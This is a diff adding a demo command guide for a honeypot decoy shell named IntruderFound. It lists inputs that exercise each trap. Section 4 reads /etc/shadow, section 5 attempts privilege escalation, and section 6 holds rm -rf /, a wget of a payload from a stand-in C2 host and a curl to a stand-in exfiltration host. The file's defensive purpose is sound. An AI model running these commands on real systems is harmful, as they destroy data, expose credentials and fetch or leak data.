@@ -1,0 +1,208 @@
+# ==============================================================================
+# INTRUDERFOUND - DEMO COMMANDS & FEATURE SHOWCASE GUIDE
+# ==============================================================================
+# This file contains dummy commands and inputs to demonstrate every feature of 
+# the IntruderFound honeypot during a live evaluation, presentation, or testing.
+# 
+# How to run:
+#   1. Start the honeypot: ./intruderfound
+#   2. Copy & paste or type the commands below interactively.
+#   3. Once finished, type 'exit' and run './scripts/inspect.sh' to view forensics.
+# ==============================================================================
+
+# ------------------------------------------------------------------------------
+# 1. ENVIRONMENT RECONNAISSANCE & VIRTUAL FILE SYSTEM (VFS) BASICS
+# Displays: Realistic prompt identity, working directory tracking, and detailed
+# directory listing with simulated POSIX permission bits, owners, and file sizes.
+# ------------------------------------------------------------------------------
+
+# Feature: Print current working directory (starts at /home/user123)
+pwd
+
+# Feature: Directory listing showing decoy files (notes.txt, config.json, downloads)
+ls
+
+# Feature: Detailed listing with POSIX file permissions, owner, timestamps, and sizes
+ls -la
+
+
+# ------------------------------------------------------------------------------
+# 2. VFS DIRECTORY NAVIGATION & MULTI-LEVEL PATH RESOLUTION
+# Displays: Navigation through hierarchical virtual directory tree using relative 
+# paths, absolute paths, parent directory traversal (..), and root (/).
+# ------------------------------------------------------------------------------
+
+# Feature: Change directory to parent directory (/home)
+cd ..
+pwd
+
+# Feature: Navigate to root filesystem (/)
+cd /
+pwd
+ls -la
+
+# Feature: Absolute path navigation directly into system log directory
+cd /var/log
+pwd
+ls -la
+
+# Feature: Return to user home directory using ~ shortcut
+cd ~
+pwd
+
+
+# ------------------------------------------------------------------------------
+# 3. VFS FILE CREATION, WRITING & MANIPULATION
+# Displays: In-memory file creation, content inspection, file copying, renaming,
+# and deletion without touching host macOS/Linux disk files.
+# ------------------------------------------------------------------------------
+
+# Feature: Create a new custom directory in the virtual filesystem
+mkdir test_vault
+ls -la
+
+# Feature: Enter the newly created directory
+cd test_vault
+pwd
+
+# Feature: Create an empty file with dynamic creation timestamp
+touch scan_results.txt
+ls -la
+
+# Feature: Write text content into virtual file using echo redirection
+echo "Host 192.168.1.50 port 22 open" > scan_results.txt
+
+# Feature: Read and display file contents from virtual inode memory
+cat scan_results.txt
+
+# Feature: Copy file to another target path in VFS
+cp scan_results.txt backup_scan.txt
+ls -la
+
+# Feature: Rename/move file within the virtual filesystem
+mv backup_scan.txt final_report.txt
+ls -la
+
+# Feature: Read the renamed file to verify data integrity
+cat final_report.txt
+
+# Feature: Delete a file from VFS and verify removal
+rm final_report.txt
+ls -la
+
+# Feature: Return back to user home directory
+cd /home/user123
+
+
+# ------------------------------------------------------------------------------
+# 4. CREDENTIAL HUNTING & SENSITIVE FILE ACCESS (DECEPTION TRAP)
+# Displays: Honey-tokens and bait files designed to attract attacker interest.
+# Commands access decoy files and are flagged by security evaluation.
+# ------------------------------------------------------------------------------
+
+# Feature: Inspect decoy application config containing mock API keys & credentials
+cat config.json
+
+# Feature: Inspect decoy user notes containing hints about system admin
+cat notes.txt
+
+# Feature: Read simulated system passwd file containing mock user accounts
+cat /etc/passwd
+
+# Feature: Attempt reading sensitive shadow file (triggers suspicious categorization)
+cat /etc/shadow
+
+
+# ------------------------------------------------------------------------------
+# 5. PRIVILEGE ESCALATION ATTEMPTS (REALISTIC ERROR SIMULATION)
+# Displays: Authentic Linux failure responses that keep attacker deceived without
+# revealing detection (avoids warning messages that reveal honeypot presence).
+# ------------------------------------------------------------------------------
+
+# Feature: Sudo simulation prompts for password and mimics authentic password failure
+# (Type any dummy password like 'admin123' or 'toor' when prompted)
+sudo su
+
+# Feature: Direct root switch simulation (su) with Linux authentication failure
+su -
+
+# Feature: Password modification attempt (simulates PAM token manipulation error)
+passwd
+
+# Feature: Attempt to alter permissions of sensitive file (simulates Permission Denied)
+chmod 777 /etc/passwd
+
+# Feature: Attempt to change file ownership (simulates Operation Not Permitted)
+chown root:root notes.txt
+
+
+# ------------------------------------------------------------------------------
+# 6. DESTRUCTIVE ACTIONS & RECONNAISSANCE TOOL TRAPPING
+# Displays: Safety interlocks for destructive commands and automatic forensic
+# tagging of suspicious attacker reconnaissance, downloads, and exploitation tools.
+# ------------------------------------------------------------------------------
+
+# Feature: Destructive root deletion trap (mimics Linux safety warning, blocks host damage)
+rm -rf /
+
+# Feature: Network scanner reconnaissance trap (categorized and logged with high risk)
+nmap 192.168.1.1
+
+# Feature: Malicious payload download trap (categorized as unauthorized download)
+wget http://malicious-c2.net/payload.sh
+
+# Feature: Data exfiltration / beaconing trap (categorized as network activity)
+curl http://attacker-controlled.site/exfil
+
+
+# ------------------------------------------------------------------------------
+# 7. INTERACTIVE VI EDITOR DECOY (RAW TERMINAL MODE)
+# Displays: High-fidelity vi decoy using termios raw mode, terminal drawing,
+# escape key sequence handling, insert mode, and Ex commands.
+# ------------------------------------------------------------------------------
+
+# Feature: Open decoy vi text editor on a file
+# Interactive controls inside vi:
+#   - Press 'i' to enter INSERT mode and type text
+#   - Press 'Escape' (Esc) key to return to COMMAND mode
+#   - Type ':w' + Enter to save buffer to VFS file
+#   - Type ':q' + Enter or ':wq' + Enter to exit editor back to shell
+vi notes.txt
+
+
+# ------------------------------------------------------------------------------
+# 8. SIGNAL RESILIENCE (CONTROL-C / CONTROL-Z INTERCEPTION)
+# Displays: POSIX sigaction handler intercepting termination signals so the decoy
+# shell does not crash when the attacker tries to break out of a program.
+# ------------------------------------------------------------------------------
+
+# Feature: Press Ctrl+C on the keyboard
+# Expected Behavior: Prints '^C' and renders a clean, fresh prompt without aborting.
+
+# Feature: Press Ctrl+Z on the keyboard
+# Expected Behavior: Safely handled without suspending or breaking the honeypot.
+
+
+# ------------------------------------------------------------------------------
+# 9. CLEAN LOGOUT & TERMINATION
+# Displays: Clean session termination, buffer flushing, and log synchronization.
+# ------------------------------------------------------------------------------
+
+# Feature: Gracefully disconnect from the decoy shell (or type 'logout')
+exit
+
+
+# ------------------------------------------------------------------------------
+# 10. FORENSIC AUDITING & SESSION INSPECTION (RUN IN HOST TERMINAL)
+# Displays: Real-time parsing of session.log, incident metrics, and report generation.
+# ------------------------------------------------------------------------------
+
+# Feature: Run the automated forensic inspection script
+# Run this from the project directory: /Users/dhruv/IntruderFound
+# Command:
+#   ./scripts/inspect.sh
+#
+# Generated Outputs:
+#   - reports/report_*.txt (Standard plaintext forensic report)
+#   - reports/report_*.md  (Markdown formatted incident report)
+# ==============================================================================
